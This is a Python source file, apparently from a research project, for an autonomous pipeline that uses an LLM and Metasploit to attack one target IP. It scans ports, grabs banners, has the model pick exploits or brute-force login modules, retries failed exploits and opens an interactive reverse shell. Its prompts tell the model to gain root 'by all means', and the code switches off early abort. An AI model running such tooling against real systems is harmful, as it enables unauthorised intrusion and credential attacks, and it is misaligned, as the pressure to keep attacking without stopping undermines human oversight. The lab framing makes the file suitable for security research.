# -*- coding: utf-8 -*-
import time
import json
import re
import sys
import os
import datetime
import socket
import concurrent.futures
import argparse
import ipaddress

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

os.environ["ANONYMIZED_TELEMETRY"] = "False"

from src.metasploit_client import MetasploitClient
from src.llm_client import LLMClient
from src.rag_engine import RagEngine
from src.pipeline_common import PipelineBase, resolve_target
from src import recon, wordlists

# --- COLORS ---
C_RED, C_GREEN, C_YELLOW, C_BLUE, C_RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
C_BOLD, C_CYAN, C_MAGENTA = "\033[1m", "\033[96m", "\033[95m"

# --- CONFIG ---
LOOT_DIR = "/app/data/logs"
WORDLIST_PATH = "/app/data/credentials.txt"
API_KEY_PATH = "/app/config/api_key.txt"

os.makedirs(LOOT_DIR, exist_ok=True)

class PentestPipeline(PipelineBase):
    def __init__(self, target_ip, attacker_ip, use_rag=True, only_port=None):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.use_rag = use_rag
        self.only_port = str(only_port) if only_port else None
        
        print("=== INICIALIZANDO PIPELINE AUTONOMO (V17 - SINGLE TARGET DIRECT) ===")
        print(f"[*] Alvo Definido: {self.target_ip}") 
        print(f"[*] IP do Atacante (LHOST): {self.attacker_ip}")
        print(f"[*] Wordlist: {WORDLIST_PATH}")
        print(f"[*] Logs serao salvos em: {LOOT_DIR}")
        print(f"[*] Modo RAG: {'HABILITADO' if self.use_rag else 'DESATIVADO (LLM pura / baseline)'}")
        
        self.setup_api_key()
        
        try:
            self.msf = MetasploitClient(password="msfpass", server="192.168.70.20")
            with open(os.devnull, 'w') as fnull:
                old_stderr = sys.stderr
                sys.stderr = fnull
                try:
                    self.llm = LLMClient()
                    self.rag = RagEngine() if self.use_rag else None
                finally:
                    sys.stderr = old_stderr
        except Exception as e:
            print(f"[CRITICO] Falha ao iniciar componentes: {e}")
            sys.exit(1)
            
        self.history = []
        self.open_ports = {} 
        self.session_id = None
        self.evidence = {}
    
    def check_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.7) 
            if sock.connect_ex((self.target_ip, port)) == 0:
                sock.close()
                return port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            if sock.connect_ex((self.target_ip, port)) == 0:
                sock.close()
                return port
        except: pass
        return None

    def fast_python_scan(self):
        open_ports_found = []
        ports = list(range(1, 6000)) + list(range(20000, 30000))
        print(f"{C_YELLOW}[*] Escaneando {len(ports)} portas...{C_RESET}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            future_to_port = {executor.submit(self.check_port, p): p for p in ports}
            for future in concurrent.futures.as_completed(future_to_port):
                p = future.result()
                if p: open_ports_found.append(str(p))
        return sorted(open_ports_found, key=int)

    def get_service_banner(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((self.target_ip, int(port)))
            try:
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                if banner:
                    s.close()
                    return re.sub(r'[^\x20-\x7E]', '', banner)
            except socket.timeout: pass

            try:
                s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                s.close()
                clean = re.sub(r'[^\x20-\x7E]', '', banner)
                return clean if clean else "Unknown Service"
            except:
                s.close()
                return "No Banner"
        except: return "No Banner"

    # --- RELATORIO ---
    def generate_text_report(self):
        now = datetime.datetime.now()
        safe_ip = self.target_ip.replace(".", "_")
        filename = f"{safe_ip}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        filepath = os.path.join(LOOT_DIR, filename)
        
        lines = [
            "="*50, "RELATORIO FINAL", "="*50,
            f"DATA: {now}", f"STATUS: {'PWNED' if self.session_id else 'FALHA'}", "-"*50,
            f"PORTAS: {list(self.open_ports.keys())}", "\n[HISTORICO]"
        ] + [f"- {h}" for h in self.history]
        
        if hasattr(self, 'evidence') and self.evidence.get("shell_info"):
             lines.append("\n[EVIDENCIAS]")
             lines.append(f"SHELL INFO: {self.evidence['shell_info']}")

        try:
            with open(filepath, "w") as f: f.write("\n".join(lines))
            print(f"\n{C_GREEN}{'='*60}")
            print(f" [LOG] RELATORIO SALVO: {filepath}")
            print(f"{'='*60}{C_RESET}\n")
        except Exception as e:
            print(f"{C_RED}[ERRO LOG] Nao foi possivel salvar relatorio: {e}{C_RESET}")

    def enter_interactive_mode(self):
        if not self.session_id: return
        print(f"\n{C_MAGENTA}=== MODO INTERATIVO (SESSAO {self.session_id}) ==={C_RESET}")
        try:
            self.msf.client.call('session.shell_write', [self.session_id, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"])
            time.sleep(1)
            self.msf.client.call('session.shell_read', [self.session_id])
        except: pass

        while True:
            try:
                cmd = input(f"{C_BOLD}{C_BLUE}Shell@{self.target_ip} > {C_RESET}")
                if cmd.lower() in ['exit', 'quit']:
                    print(f"{C_YELLOW}[*] Encerrando interacao.{C_RESET}")
                    break
                if not cmd.strip(): continue
                self.msf.client.call('session.shell_write', [self.session_id, cmd + "\n"])
                time.sleep(1.5)
                res = self.msf.client.call('session.shell_read', [self.session_id])
                if res and res.get('data'): print(f"{C_GREEN}{res['data'].strip()}{C_RESET}")
            except: break

    def run(self):
        self.cleanup_sessions()
        print(f"\n>>> [FASE 1] RECONHECIMENTO")
        rec = recon.scan(self.target_ip)
        self.services = rec.get("ports", {})
        if self.only_port:
            self.services = {pp: ii for pp, ii in self.services.items() if str(pp) == self.only_port}
        print(f"    [*] Metodo de scan: {rec.get('method')}")
        if not self.services:
            print(f"{C_RED}[!] Nenhuma porta aberta encontrada.{C_RESET}")
            return
        self.open_ports = {}
        for p, info in sorted(self.services.items(), key=lambda x: int(x[0])):
            self.open_ports[p] = info.get("banner", "")
            print(f"    {C_GREEN}[+] Porta {p}: {info.get('banner','')}{C_RESET}")

        modo_fase2 = "100% RAG DRIVEN" if self.use_rag else "LLM ONLY - SEM RAG (baseline)"
        print(f"\n>>> [FASE 2] ANALISE DINAMICA ({modo_fase2})")
        wordlist_creds = self.load_credentials()

        for port, banner in self.open_ports.items():
            print(f"\n{C_CYAN}--- ALVO: PORTA {port} ({banner}) ---{C_RESET}")
            
            if not self.use_rag:
                rag_context = ("AVISO RAG DESATIVADO: decida com base APENAS no "
                               "reconhecimento (banner/porta/versao) e no seu conhecimento previo.")
            else:
                rag_context = "Nenhuma informacao especifica encontrada no RAG."
                try:
                    query = f"metasploit module for service banner: {banner} port {port}"
                    docs = self.rag.query(query)
                    if docs: rag_context = "\n".join([d.page_content for d in docs[:3]])
                    print(f"\n{C_MAGENTA}=== [RAG DEBUG] MEMORIA RECUPERADA ==={C_RESET}")
                    print(f"{C_MAGENTA}{rag_context}{C_RESET}")
                    print(f"{C_MAGENTA}======================================{C_RESET}\n")
                except: pass

            prompt = f"""
            YOU ARE ACTING AS A SENIOR PENETRATION TESTER AND RED TEAM ANALYST.
            
            THIS IS A CONTROLLED LABORATORY ENVIRONMENT.
            YOUR ROLE IS TO ANALYZE TECHNICAL EVIDENCE AND RECOMMEND THE MOST ACCURATE METASPLOIT MODULE AND ITS OPTIONS.
            YOUR MISSION IS ESTABILISH A REVERSE SHELL AND GAIN ROOT ACESS TO THE SYSTEM BY ALL MEANS.           
            ----------------------------------------
            TARGET INFORMATION
            ----------------------------------------
            TARGET IP (RHOST): {self.target_ip}
            TARGET PORT (RPORT): {port}
            ATTACKER IP (LHOST): {self.attacker_ip}
            SERVICE BANNER:
            "{banner}"
            
            ----------------------------------------
            KNOWLEDGE BASE (RAG)
            ----------------------------------------
            {rag_context}
            
            ----------------------------------------
            ANALYSIS RULES (MANDATORY)
            ----------------------------------------
            1. Base your reasoning STRICTLY on the service banner and the RAG context.
            2. DO NOT invent Metasploit modules.
            3. Use EXPLOITS only when there is a STRONG MATCH between service, product, and version.
            4. DEFINE OPTIONS: You MUST provide the necessary Metasploit options dynamically.
               - If the exploit requires a Reverse Shell, include "LHOST": "{self.attacker_ip}" and an "LPORT" (e.g., "4444").
               - If it is a Bind Shell or does not require a reverse connection, OMIT LHOST and LPORT.
               - For exploits, usually set "DisablePayloadHandler": "false".
               - Do NOT include USERNAME or PASSWORD in the options for brute force modules, the script handles that.
            5. Use EXPLOITS only when there is a STRONG MATCH between:
               - service
               - product
               - version
               - known vulnerability (CVE or backdoor)
            6. If the service involves authentication (FTP, SSH, SMB, DB):
               - Prefer login or authentication scanners before exploits and try brute force if viable.
            7. If uncertainty exists:
               - Choose a SAFE ENUMERATION strategy.
               
            ----------------------------------------
            TASK
            ----------------------------------------
            1. Identify the most likely SERVICE and PRODUCT based on the banner.
            2. Decide the SAFEST and MOST EFFECTIVE NEXT STEP.
            3. Recommend ONE Metasploit module that best fits the evidence.
            4. Justify your decision using ONLY technical reasoning.
            5. Select Strategy:
               - "brute_force": for authentication services, using an authentication login scanner (never for a backdoor/exploit).
               - "enumeration": ONLY for version scanners or simple checks (NO credentials used).
               - "exploit_cve": when product and version strongly match a known vulnerability or backdoor (reason from the banner and the RAG knowledge; do not rely on hardcoded examples).
               - "skip": If unknown
               
               
            ----------------------------------------
            OUTPUT FORMAT (JSON ONLY)
            ----------------------------------------
            {{
              "module_type": "auxiliary" | "exploit",
              "module_name": "category/service/module_name",
              "strategy": "enumeration" | "brute_force" | "exploit_cve",
              "options": {{"OPT_NAME": "OPT_VALUE"}},
              "confidence": "HIGH" | "MEDIUM" | "LOW",
              "reason": "Explain your decision"
            }}
            
            IMPORTANT:
            - If no strong exploit candidate exists, return a scanner with LOW or MEDIUM confidence.
            - Precision is more important than aggression.
            - Your goal is accuracy, not exploitation speed.
            """
            
            resp = self.ask_llm_robust(prompt)
            plan = {}
            if resp:
                try: 
                    if "{" in resp: resp = resp[resp.find("{"):resp.rfind("}")+1]
                    plan = json.loads(resp)
                except: pass

            strategy = plan.get('strategy', 'skip').lower()
            module = plan.get('module', '').strip()
            if not module: module = plan.get('module_name', '').strip()
            
            llm_options = plan.get('options', {})
            
            if resp: print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}'{C_RESET}")

            if not resp:
                print(f"{C_RED}[LLM] Modelo indisponivel apos retries: sem decisao para a porta {port}. "
                      f"Pulando (sem fallback hardcoded).{C_RESET}")
                continue
            if strategy == "skip" or not module:
                print(f"{C_YELLOW}[AI] O modelo decidiu nao atacar a porta {port}.{C_RESET}")
                continue

            if "login" in module or "credential" in module: strategy = "brute_force"

            if not module.startswith("auxiliary") and not module.startswith("exploit"):
                if module.startswith("scanner") or module.startswith("admin"):
                    module = "auxiliary/" + module

            # --- BLINDAGEM DEFINITIVA DO PARSER ---
            # 1. Limpa o nome removendo qualquer prefixo indesejado
            clean_name = module.replace("exploit/", "").replace("auxiliary/", "").strip("/")

            # 2. Verifica se o modulo existe
            if not self.msf.verify_module_exists("auxiliary", clean_name) and \
               not self.msf.verify_module_exists("exploit", clean_name):
                # Autocorrecao AUTONOMA: o erro volta ao LLM para ele re-decidir
                # (sem heuristica hardcoded de substituicao de modulo).
                fix_prompt = (f"O modulo Metasploit '{module}' nao existe nesta instalacao.\n"
                              f"Servico/banner: {banner}\nContexto (RAG):\n{rag_context}\n"
                              f"Responda SOMENTE JSON com um modulo Metasploit REAL e valido: "
                              f'{{"module_type":"auxiliary|exploit","module_name":"cat/serv/mod","strategy":"enumeration|brute_force|exploit_cve"}}')
                fresp = self.ask_llm_robust(fix_prompt)
                fixed = ""
                if fresp:
                    try:
                        if "{" in fresp: fresp = fresp[fresp.find("{"):fresp.rfind("}")+1]
                        fp = json.loads(fresp)
                        fixed = (fp.get("module_name") or "").strip()
                        if fp.get("strategy"): strategy = fp["strategy"].lower()
                    except Exception: pass
                if fixed:
                    module = fixed
                    clean_name = fixed.replace("exploit/", "").replace("auxiliary/", "").strip("/")
                if not (self.msf.verify_module_exists("auxiliary", clean_name) or
                        self.msf.verify_module_exists("exploit", clean_name)):
                    print(f"{C_RED}[ERRO] Modulo invalido e o LLM nao forneceu alternativa valida. Pulando.{C_RESET}")
                    continue

            # 3. Define o tipo cravado baseado na estrategia da IA
            if strategy == "exploit_cve":
                m_type = "exploit"
            else:
                m_type = "auxiliary"
                
            m_name = clean_name

            opts = {"RHOSTS": self.target_ip, "RPORT": int(port)}
            opts.update(llm_options) 
            
            if strategy != "skip":
                print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO ({strategy.upper()}){C_RESET}")
            
            if strategy == "brute_force":
                wl = wordlists.resolve()
                if not (wl["userpass_file"] or wl["pass_file"]):
                    print(f"{C_YELLOW}[SKIP] Sem wordlist disponivel.{C_RESET}")
                    continue
                print(f"{C_YELLOW}[*] Brute force (arquivo) em {m_name} | {wl['stats']}{C_RESET}")
                before_sid = self._max_sid()
                out = self.msf.run_login_scanner(m_name, opts,
                                                 userpass_file=wl["userpass_file"],
                                                 user_file=wl["user_file"],
                                                 pass_file=wl["pass_file"]) or ""
                creds = re.findall(r"(?:Success|Login Successful|succeeded)[^\n]*", out)
                sid = self._max_sid()
                if sid and sid != before_sid:
                    self.session_id = sid
                    self.history.append(f"[SUCESSO] Porta {port} via {m_name} (sessao {sid})")
                    print(f"\n{C_GREEN}[***] PWNED! Sessao {sid} via {m_name}.{C_RESET}")
                elif creds:
                    self.history.append(f"[CRED] Porta {port} via {m_name}: {creds[:3]}")
                    print(f"\n{C_GREEN}[+] Credenciais validas: {creds[:3]}{C_RESET}")
                else:
                    print(f"\n{C_RED}[FALHA] Nenhuma credencial valida na wordlist.{C_RESET}")

            elif strategy == "enumeration":
                print(f"{C_YELLOW}[*] Executando Scanner (Run Once)...{C_RESET}")
                try:
                    self.msf.run_module(m_type, m_name, opts)
                    time.sleep(4)
                    print(f"{C_GREEN}[INFO] Scanner finalizado.{C_RESET}")
                except Exception as e: print(f"{C_RED}[ERRO] {e}{C_RESET}")

            # --- DEBUG DETALHADO DO EXPLOIT COM AUTO-RETRY ---
            elif strategy == "exploit_cve":
                print(f"{C_YELLOW}[*] Iniciando cadeia de Exploit (com Auto-Retry AI)...{C_RESET}")
                
                max_attempts = 3
                for attempt in range(1, max_attempts + 1):
                    opts["DisablePayloadHandler"] = opts.get("DisablePayloadHandler", "false")
                    
                    print(f"\n{C_YELLOW}[DEBUG] Tentativa {attempt}/{max_attempts} - Executando {m_type}/{m_name}{C_RESET}")
                    print(f"{C_YELLOW}[DEBUG] Opcoes injetadas pela IA: {opts}{C_RESET}")
                    
                    self.msf.run_module(m_type, m_name, opts)
                    print(f"{C_YELLOW}[DEBUG] Exploit enviado. Aguardando 20s...{C_RESET}")
                    time.sleep(20) 
                    
                    sessions = self.msf.client.call('session.list') or {}
                    if sessions:
                        sid = str(max([int(k) for k in sessions.keys()]))
                        if sid != self.session_id:
                            print(f"{C_GREEN}[***] SUCESSO ABSOLUTO! Exploit funcionou (Sessao {sid}){C_RESET}")
                            self.session_id = sid
                            self.history.append(f"[SUCESSO] Porta {port} via {m_type}/{m_name} (sessao {sid})")
                            break # SESSAO OBTIDA
                    
                    print(f"{C_RED}[FALHA] Nenhuma sessao obtida na tentativa {attempt}.{C_RESET}")
                    
                    # SE FALHOU, PEDE CORREÇÃO DO ERRO
                    if attempt < max_attempts:
                        print(f"{C_YELLOW}[*] Consultando a IA Estrategista para recalcular os parametros...{C_RESET}")
                        retry_prompt = f"""
                        The exploit '{m_name}' failed to create a session on {self.target_ip}.
                        The options used were: {opts}
                        
                        As an expert, you know some exploits require exact TARGET architectures (e.g., 1=VMware, 2=Hyper-V, 3=Baremetal) or specific PAYLOADs (like reverse_tcp or generic reverse shells).
                        
                        Provide a revised set of options to try again. If you believe changing the TARGET, PAYLOAD, or any other option will work, do so now.
                        Do NOT give up prematurely: we will exhaust every attempt, so always return your best revised options.
                        
                        OUTPUT FORMAT (JSON ONLY):
                        {{
                          "strategy": "exploit_cve",
                          "options": {{"OPT_NAME": "NEW_OPT_VALUE"}},
                          "reason": "Explain exactly what you changed (e.g., 'Changed TARGET to 2' or 'Added PAYLOAD')."
                        }}
                        """
                        resp = self.ask_llm_robust(retry_prompt)
                        if resp:
                            try:
                                if "{" in resp: resp = resp[resp.find("{"):resp.rfind("}")+1]
                                new_plan = json.loads(resp)
                                
                                if False:  # aborto precoce desabilitado: esgota todas as tentativas
                                    print(f"{C_RED}[AI] Decidiu abortar as tentativas: {new_plan.get('reason')}{C_RESET}")
                                    break
                                
                                # ATUALIZA COM NOVA SUGESTÃO
                                new_opts = new_plan.get("options", {})
                                opts.update(new_opts) 
                                print(f"{C_BLUE}[AI AUTO-CORRECTION] {new_plan.get('reason', 'Parametros ajustados.')}{C_RESET}")
                            except Exception as e:
                                print(f"{C_RED}[ERRO AI] Falha ao processar reajuste.{C_RESET}")
                
                if not self.session_id:
                    print(f"{C_RED}[FALHA GERAL] Todas as tentativas de exploit falharam.{C_RESET}")

            if self.session_id: 
                print(f"{C_GREEN}[!] Acesso obtido. Parando scan.{C_RESET}")
                break
        
        if self.session_id: self.phase_4_post_exploitation()
        self.store_attack_experience()
        self.generate_text_report()

    def phase_4_post_exploitation(self):
        print(f"\n>>> [FASE 4] POST-EXPLORACAO")
        try:
            self.msf.client.call('session.shell_write', [self.session_id, "id; hostname\n"])
            time.sleep(3)
            res = self.msf.client.call('session.shell_read', [self.session_id])
            print(f"{C_GREEN}{res['data']}{C_RESET}")
            self.evidence["shell_info"] = str(res['data'])
            
            with open(f"{LOOT_DIR}/pwned.txt", "w") as f:
                f.write(f"ALVO: {self.target_ip}\nSESSAO: {self.session_id}\nDADOS: {res['data']}")
        except: pass

def get_best_route_ip(target_ip):
    """Descobre o IP de LHOST correto simulando uma rota ate o alvo."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 1)) 
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "192.168.70.20"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Pipeline Single Target - Autonomo Ragsploit")
    parser.add_argument("--target", type=str, default=None, help="IP do alvo (ex: 10.0.0.1); se omitido, usa config/target.json")
    parser.add_argument("--disable-rag", action="store_true", help="Desativa o RAG (ChromaDB): roda o modelo isoladamente (baseline).")
    parser.add_argument("--port", type=int, default=None, help="Restringe a analise a UMA porta (ex: 139), para A/B RAG on/off.")
    args = parser.parse_args()

    target = resolve_target(args.target)
    lhost = get_best_route_ip(target)

    p = PentestPipeline(target_ip=target, attacker_ip=lhost, use_rag=not args.disable_rag, only_port=args.port)
    try:
        p.run()
        if p.session_id:
            p.enter_interactive_mode()
    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[!] Interrupcao detectada. Salvando logs...{C_RESET}")
        p.generate_text_report()